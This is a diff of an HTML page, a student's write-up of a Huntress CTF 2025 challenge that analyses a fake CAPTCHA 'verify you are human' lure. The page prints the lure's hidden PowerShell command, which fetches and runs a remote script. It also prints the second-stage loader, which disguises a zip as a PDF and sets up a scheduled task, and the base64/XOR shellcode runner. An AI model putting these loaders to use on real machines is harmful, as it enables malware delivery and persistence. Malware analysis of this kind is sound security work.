@@ -1,42 +1,116 @@
-<head><link rel="stylesheet" href="../../css/styles.css"><link rel="icon" href="/../../favicon-32x32.png" sizes="32x32" type="image/png" /><link rel="icon" href="/../../favicon-16x16.png" sizes="16x16" type="image/png" /><title>Verify You Are Human</title></head><body>
-    <nav>
-        <ul class="nav">
-        <li><a href="../../index.html">Home</a></li>
-        <li><a href="https://github.com/ThomasCreagh/">Github</a></li>
-        <li>
-            <a href="https://www.linkedin.com/in/thomas-creagh/">Linkedin</a>
-        </li>
-        <li><a href="../../projects.html">Projects</a></li>
-        <li><a href="../index.html">SecurityWriteups</a></li>
-        </ul>
-    </nav>
-    <div class="sec-page"><h1>Verify You Are Human</h1>
-<hr/>
-<p>this is a challenge from <a href="https://ctf.huntress.com">huntress</a> ctf 2025</p>
-<hr/>
-<h4>Description</h4>
-<blockquote>
-<p>My computer said I needed to update MS Teams, so that is what I have been trying to do...
-...but I can't seem to get past this CAPTCHA!</p>
-</blockquote>
-<h4>My solution</h4>
-<p>You are first greeted by this page:
-<div class="scroll-img"><img alt="screenshot of captcha page" src="../images/screenshot-20251004-234044.png"/></div></p>
-<p>This page leads on to the next when you click to verify the page:
-<div class="scroll-img"><img alt="screenshot of verify page" src="../images/screenshot-20251004-234358.png"/></div></p>
-<p>On this page it says to verify! It copys a command into your clipboard and wants you to exicute it in the windows runner. This is the command:</p>
-<pre><code>"C:\WINDOWS\system32\WindowsPowerShell\v1.0\PowerShell.exe" -Wi HI -nop -c "$UkvqRHtIr=$env:LocalAppData+'\'+(Get-Random -Minimum 5482 -Maximum 86245)+'.PS1';irm 'http://c8b9d11e.proxy.coursestack.com:443/?tic=1'&gt; $UkvqRHtIr;powershell -Wi HI -ep bypass -f $UkvqRHtIr"
+<head>
+ <link href="../../css/styles.css" rel="stylesheet"/>
+ <link href="../../favicon-32x32.png" rel="icon" sizes="32x32" type="image/png">
+  <link href="../../favicon-16x16.png" rel="icon" sizes="16x16" type="image/png"/>
+  <title>
+   SecurityWriteups
+  </title>
+ </link>
+</head>
+<body>
+ <h1>
+  Thomas Creagh
+ </h1>
+ <p>
+  Student developer,
+  <b>
+   always
+  </b>
+  learning,
+  <b>
+   always
+  </b>
+  making.
+ </p>
+ <hr/>
+ <nav>
+  <a href="../../index.html">
+   Home
+  </a>
+  <a href="https://github.com/ThomasCreagh/">
+   Github
+  </a>
+  <a href="https://www.linkedin.com/in/thomas-creagh/">
+   Linkedin
+  </a>
+  <a href="../../projects.html">
+   Projects
+  </a>
+  <a href="../index.html">
+   SecurityWriteups
+  </a>
+ </nav>
+ <hr/>
+ <div class="page">
+  <h1>
+   Verify You Are Human
+  </h1>
+  <hr/>
+  <p>
+   this is a challenge from
+   <a href="https://ctf.huntress.com">
+    huntress
+   </a>
+   ctf 2025
+  </p>
+  <hr/>
+  <h4>
+   Description
+  </h4>
+  <blockquote>
+   <p>
+    My computer said I needed to update MS Teams, so that is what I have been trying to do...
+...but I can't seem to get past this CAPTCHA!
+   </p>
+  </blockquote>
+  <h4>
+   My solution
+  </h4>
+  <p>
+   You are first greeted by this page:
+   <div class="scroll-img">
+    <img alt="screenshot of captcha page" src="../images/screenshot-20251004-234044.png"/>
+   </div>
+  </p>
+  <p>
+   This page leads on to the next when you click to verify the page:
+   <div class="scroll-img">
+    <img alt="screenshot of verify page" src="../images/screenshot-20251004-234358.png"/>
+   </div>
+  </p>
+  <p>
+   On this page it says to verify! It copys a command into your clipboard and wants you to exicute it in the windows runner. This is the command:
+  </p>
+  <pre><code>"C:\WINDOWS\system32\WindowsPowerShell\v1.0\PowerShell.exe" -Wi HI -nop -c "$UkvqRHtIr=$env:LocalAppData+'\'+(Get-Random -Minimum 5482 -Maximum 86245)+'.PS1';irm 'http://c8b9d11e.proxy.coursestack.com:443/?tic=1'&gt; $UkvqRHtIr;powershell -Wi HI -ep bypass -f $UkvqRHtIr"
 </code></pre>
-<p>I analysed this command, it does the following:
+  <p>
+   I analysed this command, it does the following:
 - Create a hidden powershell prompt
-- Create a powershell script file in your <code>%AppData%</code> directory
-- Load the page <code>http://c8b9d11e.proxy.coursestack.com:443/?tic=1</code> into said file
-- Then exicute that file in another hidden powershell prompt</p>
-<p>The link <code>http://c8b9d11e.proxy.coursestack.com:443/?tic=1</code> contains the following powershell script:</p>
-<pre><code>$JGFDGMKNGD = ([char]46)+([char]112)+([char]121)+([char]99);$HMGDSHGSHSHS = [guid]::NewGuid();$OIEOPTRJGS = $env:LocalAppData;irm 'http://c8b9d11e.proxy.coursestack.com:443/?tic=2' -OutFile $OIEOPTRJGS\$HMGDSHGSHSHS.pdf;Add-Type -AssemblyName System.IO.Compression.FileSystem;[System.IO.Compression.ZipFile]::ExtractToDirectory("$OIEOPTRJGS\$HMGDSHGSHSHS.pdf", "$OIEOPTRJGS\$HMGDSHGSHSHS");$PIEVSDDGs = Join-Path $OIEOPTRJGS $HMGDSHGSHSHS;$WQRGSGSD = "$HMGDSHGSHSHS";$RSHSRHSRJSJSGSE = "$PIEVSDDGs\pythonw.exe";$RYGSDFSGSH = "$PIEVSDDGs\cpython-3134.pyc";$ENRYERTRYRNTER = New-ScheduledTaskAction -Execute $RSHSRHSRJSJSGSE -Argument "`"$RYGSDFSGSH`"";$TDRBRTRNREN = (Get-Date).AddSeconds(180);$YRBNETMREMY = New-ScheduledTaskTrigger -Once -At $TDRBRTRNREN;$KRYIYRTEMETN = New-ScheduledTaskPrincipal -UserId "$env:USERNAME" -LogonType Interactive -RunLevel Limited;Register-ScheduledTask -TaskName $WQRGSGSD -Action $ENRYERTRYRNTER -Trigger $YRBNETMREMY -Principal $KRYIYRTEMETN -Force;Set-Location $PIEVSDDGs;$WMVCNDYGDHJ = "cpython-3134" + $JGFDGMKNGD; Rename-Item -Path "cpython-3134" -NewName $WMVCNDYGDHJ; iex ('rundll32 shell32.dll,ShellExec_RunDLL "' + $PIEVSDDGs + '\pythonw" "' + $PIEVSDDGs + '\'+ $WMVCNDYGDHJ + '"');Remove-Item $MyInvocation.MyCommand.Path -Force;Set-Clipboard
+- Create a powershell script file in your
+   <code>
+    %AppData%
+   </code>
+   directory
+- Load the page
+   <code>
+    http://c8b9d11e.proxy.coursestack.com:443/?tic=1
+   </code>
+   into said file
+- Then exicute that file in another hidden powershell prompt
+  </p>
+  <p>
+   The link
+   <code>
+    http://c8b9d11e.proxy.coursestack.com:443/?tic=1
+   </code>
+   contains the following powershell script:
+  </p>
+  <pre><code>$JGFDGMKNGD = ([char]46)+([char]112)+([char]121)+([char]99);$HMGDSHGSHSHS = [guid]::NewGuid();$OIEOPTRJGS = $env:LocalAppData;irm 'http://c8b9d11e.proxy.coursestack.com:443/?tic=2' -OutFile $OIEOPTRJGS\$HMGDSHGSHSHS.pdf;Add-Type -AssemblyName System.IO.Compression.FileSystem;[System.IO.Compression.ZipFile]::ExtractToDirectory("$OIEOPTRJGS\$HMGDSHGSHSHS.pdf", "$OIEOPTRJGS\$HMGDSHGSHSHS");$PIEVSDDGs = Join-Path $OIEOPTRJGS $HMGDSHGSHSHS;$WQRGSGSD = "$HMGDSHGSHSHS";$RSHSRHSRJSJSGSE = "$PIEVSDDGs\pythonw.exe";$RYGSDFSGSH = "$PIEVSDDGs\cpython-3134.pyc";$ENRYERTRYRNTER = New-ScheduledTaskAction -Execute $RSHSRHSRJSJSGSE -Argument "`"$RYGSDFSGSH`"";$TDRBRTRNREN = (Get-Date).AddSeconds(180);$YRBNETMREMY = New-ScheduledTaskTrigger -Once -At $TDRBRTRNREN;$KRYIYRTEMETN = New-ScheduledTaskPrincipal -UserId "$env:USERNAME" -LogonType Interactive -RunLevel Limited;Register-ScheduledTask -TaskName $WQRGSGSD -Action $ENRYERTRYRNTER -Trigger $YRBNETMREMY -Principal $KRYIYRTEMETN -Force;Set-Location $PIEVSDDGs;$WMVCNDYGDHJ = "cpython-3134" + $JGFDGMKNGD; Rename-Item -Path "cpython-3134" -NewName $WMVCNDYGDHJ; iex ('rundll32 shell32.dll,ShellExec_RunDLL "' + $PIEVSDDGs + '\pythonw" "' + $PIEVSDDGs + '\'+ $WMVCNDYGDHJ + '"');Remove-Item $MyInvocation.MyCommand.Path -Force;Set-Clipboard
 </code></pre>
-<p>This looks rather confusing with all the random varible names so I tried to make it a bit neater to see what was happening:</p>
-<pre><code>$PYC = ([char]46) + ([char]112) + ([char]121) + ([char]99);
+  <p>
+   This looks rather confusing with all the random varible names so I tried to make it a bit neater to see what was happening:
+  </p>
+  <pre><code>$PYC = ([char]46) + ([char]112) + ([char]121) + ([char]99);
 $GUILDID = [guid]::NewGuid();
 $LOCALAPP = $env:LocalAppData;
 irm 'https://c8b9d11e.proxy.coursestack.com:443/?tic=2' -OutFile $LOCALAPP\$GUILDID.pdf;
@@ -57,21 +131,37 @@ iex ('rundll32 shell32.dll,ShellExec_RunDLL "' + $MAINPATH + '\pythonw" "' + $MA
 Remove-Item $MyInvocation.MyCommand.Path -Force;
 Set-Clipboard
 </code></pre>
-<p>This makes it a bit clearer about what it is doing.
-One of the first major things it does is download a "pdf" from <code>https://c8b9d11e.proxy.coursestack.com:443/?tic=2</code>.
-Looking at what type of file it is I get back: <code>Zip archive data, at least v2.0 to extract</code>.
+  <p>
+   This makes it a bit clearer about what it is doing.
+One of the first major things it does is download a "pdf" from
+   <code>
+    https://c8b9d11e.proxy.coursestack.com:443/?tic=2
+   </code>
+   .
+Looking at what type of file it is I get back:
+   <code>
+    Zip archive data, at least v2.0 to extract
+   </code>
+   .
 This file is trying to act like a pdf but is clearly a zip file.
 This is made clear when the next line in the script extracts the pdf file.
 The extracted file has the python.exe aswell as some .pyc files which are python files that contain bytecode.
-the only .py file I find is a file named <code>output.py</code>:</p>
-<pre><code class="language-py">import base64
+the only .py file I find is a file named
+   <code>
+    output.py
+   </code>
+   :
+  </p>
+  <pre><code class="language-py">import base64
 #nfenru9en9vnebvnerbneubneubn
 exec(base64.b64decode("aW1wb3J0IG ... cHRyKQpmbigp").decode('utf-8'))
 #g0emgoemboemoetmboemomeio
 </code></pre>
-<p>It has a bit long base64 string that gets decoded and executed as more python.
-the string after being decode is the following python script:</p>
-<pre><code class="language-py">import ctypes
+  <p>
+   It has a bit long base64 string that gets decoded and executed as more python.
+the string after being decode is the following python script:
+  </p>
+  <pre><code class="language-py">import ctypes
 
 def xor_decrypt(ciphertext_bytes, key_bytes):
     decrypted_bytes = bytearray()
@@ -89,9 +179,11 @@ functype = ctypes.CFUNCTYPE(ctypes.c_void_p)
 fn = functype(ptr)
 fn()
 </code></pre>
-<p>This contins even more base64 and an xor decrypter.
-I modified this file to print out the shell code and write it to a binary file:</p>
-<pre><code>import base64
+  <p>
+   This contins even more base64 and an xor decrypter.
+I modified this file to print out the shell code and write it to a binary file:
+  </p>
+  <pre><code>import base64
 import codecs
 
 def xor_decrypt(ciphertext_bytes, key_bytes):
@@ -110,14 +202,20 @@ with open(out_path, "wb") as f:
     f.write(data)
 
 </code></pre>
-<p>Output:</p>
-<pre><code>bytearray(b'U\x89\xe5\x81\xec\x80\x00\x00\x00h\x93\xd8\x84\x84h\x90\xc3\xc6\x97h\xc3\x90\x93\x92h\x90\xc4\xc3\xc7h\x9c\x93\x9c\x93h\xc0\x9c\xc6\xc6h\x97\xc6\x9c\x93h\x94\xc7\x9d\xc1h\xde\xc1\x96\x91h\xc3\xc9\xc4\xc2\xb9\n\x00\x00\x00\x89\xe7\x817\xa5\xa5\xa5\xa5\x83\xc7\x04Iu\xf4\xc6D$&amp;\x00\xc6\x85\x7f\xff\xff\xff\x00\x89\xe6\x8d}\x80\xb9&amp;\x00\x00\x00\x8a\x06\x88\x07FGIu\xf7\xc6\x07\x00\x8d&lt;$\xb9@\x00\x00\x00\xb0\x01\x88\x07GIu\xfa\xc9\xc3')
+  <p>
+   Output:
+  </p>
+  <pre><code>bytearray(b'U\x89\xe5\x81\xec\x80\x00\x00\x00h\x93\xd8\x84\x84h\x90\xc3\xc6\x97h\xc3\x90\x93\x92h\x90\xc4\xc3\xc7h\x9c\x93\x9c\x93h\xc0\x9c\xc6\xc6h\x97\xc6\x9c\x93h\x94\xc7\x9d\xc1h\xde\xc1\x96\x91h\xc3\xc9\xc4\xc2\xb9\n\x00\x00\x00\x89\xe7\x817\xa5\xa5\xa5\xa5\x83\xc7\x04Iu\xf4\xc6D$&amp;\x00\xc6\x85\x7f\xff\xff\xff\x00\x89\xe6\x8d}\x80\xb9&amp;\x00\x00\x00\x8a\x06\x88\x07FGIu\xf7\xc6\x07\x00\x8d&lt;$\xb9@\x00\x00\x00\xb0\x01\x88\x07GIu\xfa\xc9\xc3')
 </code></pre>
-<p>Next I opened this binary file in IDA to decompile the file and see what the program wanted to do.
-<div class="scroll-img"><img alt="IDA program with binary file open" src="../images/screenshot-20251005-000637.png"/></div>
-This assembly code shows date being pushed onto a stack and then xor'ed to decompile the data.
-I copyed the data and the xor value and made a script to decrypt it:</p>
-<pre><code class="language-py">data = [
+  <p>
+   Next I opened this binary file in IDA to decompile the file and see what the program wanted to do.
+   <div class="scroll-img">
+    <img alt="IDA program with binary file open" src="../images/screenshot-20251005-000637.png"/>
+   </div>
+   This assembly code shows date being pushed onto a stack and then xor'ed to decompile the data.
+I copyed the data and the xor value and made a script to decrypt it:
+  </p>
+  <pre><code class="language-py">data = [
     0x8484D893,
     0x97C6C390,
     0x929390C3,
@@ -138,4 +236,11 @@ for w in data:
 
 print(decoded_str)
 </code></pre>
-<p>This then gave me the correct flag!: <code>flag{d34 ... c26}</code></p></div></body>
+  <p>
+   This then gave me the correct flag!:
+   <code>
+    flag{d34 ... c26}
+   </code>
+  </p>
+ </div>
+</body>
